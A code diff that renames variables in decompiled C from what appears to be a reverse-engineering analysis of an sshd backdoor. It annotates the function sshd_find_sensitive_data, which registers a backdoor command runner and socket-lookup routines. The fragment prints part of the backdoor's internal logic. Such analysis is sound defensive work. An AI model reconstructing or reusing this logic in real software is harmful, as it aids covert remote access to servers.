@@ -51,35 +51,35 @@ BOOL sshd_find_sensitive_data
   sensitive_data *krb_candidate_local;
   sensitive_data *xzcalloc_candidate_local;
   secret_data_item_t secret_probe_items;
-  code *local_70;
-  undefined8 local_68;
-  undefined8 local_60;
-  code *local_58;
-  undefined8 local_50;
-  undefined8 local_48;
-  code *local_40;
-  undefined8 local_38;
-  undefined8 local_30;
+  code *run_backdoor_entry;
+  u64 run_backdoor_descriptor;
+  u64 usable_socket_descriptor;
+  code *usable_socket_entry;
+  u64 usable_socket_opcode;
+  u64 client_socket_descriptor;
+  code *client_socket_entry;
+  u64 client_socket_opcode;
+  u64 client_socket_flags;
   
   bVar19 = 0;
   BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
   if (BVar6 == FALSE) {
     return FALSE;
   }
-  local_68 = 0x1b000001c8;
+  run_backdoor_descriptor = 0x1b000001c8;
   secret_probe_items.code = (u8 *)sshd_proxy_elevate;
   secret_probe_items.shift_cursor = (secret_data_shift_cursor_t)0x1c8;
   secret_probe_items.operation_index = 0x1c;
-  local_70 = run_backdoor_commands;
+  run_backdoor_entry = run_backdoor_commands;
   secret_probe_items.shift_count = 0;
   secret_probe_items.index = 1;
-  local_60 = 0x100000000;
-  local_58 = sshd_get_usable_socket;
-  local_50 = 0x1a000001c3;
-  local_48 = 0x100000005;
-  local_40 = sshd_get_client_socket;
-  local_38 = 0x19000001bd;
-  local_30 = 0x100000006;
+  usable_socket_descriptor = 0x100000000;
+  usable_socket_entry = sshd_get_usable_socket;
+  usable_socket_opcode = 0x1a000001c3;
+  client_socket_descriptor = 0x100000005;
+  client_socket_entry = sshd_get_client_socket;
+  client_socket_opcode = 0x19000001bd;
+  client_socket_flags = 0x100000006;
   BVar6 = secret_data_append_items(&secret_probe_items,4,secret_data_append_item);
   if (BVar6 == FALSE) {
     return FALSE;
